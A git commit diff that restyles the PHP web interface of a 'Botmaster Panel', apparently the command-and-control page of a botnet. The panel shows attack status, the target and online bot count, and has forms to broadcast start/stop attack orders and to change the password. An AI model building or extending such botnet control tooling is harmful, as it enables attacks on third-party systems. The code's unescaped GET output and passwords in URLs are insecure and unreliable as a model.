c3a1bee0f37d35a635b87d135825a82124229978
Daniel Haake <it.sec.operations@danielhaake.de>
2015-03-10 03:07:43 +0100

    CHANGE: changed appearance of web interface

--- panel/orders.php
+++ panel/orders.php
@@ -120,42 +120,103 @@ elseif(hash("sha512", $_GET['p']) == $curPw) {
 	}
 
 	// display panel
-	print "<h1>Botmaster Panel</h1>";
-	print "<table border=\"1\">";
-	print "<tr><td>Attack</td><td>Target</td><td>Bots Online</td></tr>";
-	print "<tr>";
-	print "<td>".$order."</td>";
-	print "<td>".$target."</td>";
-	print "<td>";
+	print "<!DOCTYPE html>";
+	print "<html>";
+	print "<head>";
+	print "<link rel=\"stylesheet\" href=\"//code.jquery.com/ui/1.11.3/themes/smoothness/jquery-ui.css\">";
+	print "<link rel=\"stylesheet\" type=\"text/css\" href=\"style.css\">";
+	print "<script src=\"//code.jquery.com/jquery-1.10.2.js\"></script>";
+	print "<script src=\"//code.jquery.com/ui/1.11.3/jquery-ui.js\"></script>";
+	print "<link rel=\"stylesheet\" href=\"/resources/demos/style.css\">";
+	print "<script>";
+	print "$(function() {";
+	print "$( \"#tabs\" ).tabs();";
+	print "$( \"#accordion\" ).accordion();";
+	print "$( \"#attackorder\" ).selectmenu();";
+	print "});";
+	print "</script>";
+	print "<style>";
+	print "select {";
+	print "width: 150px;";
+	print "}";
+	print "</style>";
+	print "</head>";
+	print "<body id=\"bodyLogin\">";
+
+	print "<table border=\"0\" id=\"tablePanel\"><tr><td>";
+	print "<img id=\"headlineLogin\" src=\"images/logo.png\"></td></tr><tr><td>";
+	print "<div id=\"tabs\" style=\"background: #d3d3d3;\">";
+	print "<ul>";
+	print "<li><a href=\"#tabs-1\">Welcome</a></li>";
+	print "<li><a href=\"#tabs-2\">Settings</a></li>";
+	print "</ul>";
+
+	print "<div id=\"tabs-1\" style=\"font-family:  Arial, sans-serif; font-size: 14px;\">";
+	print "<div id=\"accordion\">";
+	print "<h3>Attack Status</h3>";
+	print "<div>";
+	print "<table border=\"0\">";
+	print "<tr id=\"trMain\"><td>Status:</td>";
+	print "<td align=\"center\">";
+	if ($order == "no") {
+		print "Not attacking.";
+	}
+	if ($order == "yes") {
+		print "Attacking...";
+	}
+	print "</td></tr>";
+	print "<tr id=\"trAlt\"><td>Target:</td>";
+	print "<td align=\"center\">".$target."</td></tr>";
+	print "<tr id=\"trMain\"><td>Bots Online:</td>";
+	print "<td align=\"center\">";
 	$activeBots = fopen($botFile, "r");
-	$content = fread($activeBots, filesize($botFile));
-	fclose($activeBots);
-	$number = explode("\n", $content);
-	print count($number)-1;
-	print "</td>";
-	print "</tr>";
+        $content = fread($activeBots, filesize($botFile));
+        fclose($activeBots);
+        $number = explode("\n", $content);
+        print count($number)-1;
+	print "</td></tr>";
+
 	print "</table>";
+	print "</div>";
 
 	// change orders form
+	print "<h3>Broadcast New Orders</h3>";
+	print "<div>";
 	print "<form method=\"get\">";
-	print "<input type=\"radio\" name=\"order\" value=\"yes\" checked>yes";
-	print "<input type=\"radio\" name=\"order\" value=\"no\">no";
-        print "<input type=\"text\" name=\"target\" value=\"".$target."\"><br>";
+	print "<table border=\"0\"><tr>";
+	print "<td><select name=\"order\" id=\"attackorder\">";
+	print "<option value=\"yes\">start attack</option>";
+	print "<option value=\"no\">stop attack</option>";
+	print "</select></td>";
+        print "<td><input id=\"input\" type=\"text\" name=\"target\" value=\"".$target."\"></td>";
 	if ($_GET['np'] == "") {
 		print "<input type=\"hidden\" name=\"p\" value=\"".$_GET['p']."\">";
 	}
 	else {
 		print "<input type=\"hidden\" name=\"p\" value=\"".$_GET['np']."\">";
 	}
-        print "<input type=\"submit\" value=\"Submit\">";
+        print "<td><input id=\"loginButton\" type=\"submit\" value=\"Submit\"></td>";
+	print "</tr></table>";
         print "</form>";
+	print "</div>";
+	print "</div>";
+	print "</div>";
 
 	// change password form
+	print "<div id=\"tabs-2\" style=\"font-family:  Arial, sans-serif; font-size: 14px;\">";
 	print "<form method=\"get\">";
-        print "<input type=\"password\" name=\"np\" placeholder=\"new password\"><br>";
-        print "<input type=\"password\" name=\"p\" placeholder=\"old password\">";
-        print "<input type=\"submit\" value=\"Submit\">";
+	print "<table border=\"0\"><tr>";
+        print "<td>Change password: </td><td><input id=\"input\" type=\"password\" name=\"p\" placeholder=\"old password\"></td>";
+        print "<td><input id=\"input\" type=\"password\" name=\"np\" placeholder=\"new password\"></td>";
+        print "<td><input id=\"loginButton\" type=\"submit\" value=\"Submit\"></td>";
+	print "</tr></table>";
         print "</form>";
+
+	print "</div>";
+	print "</td></tr></table>";
+
+	print "</body>";
+	print "</html>";
 
 }
 else {
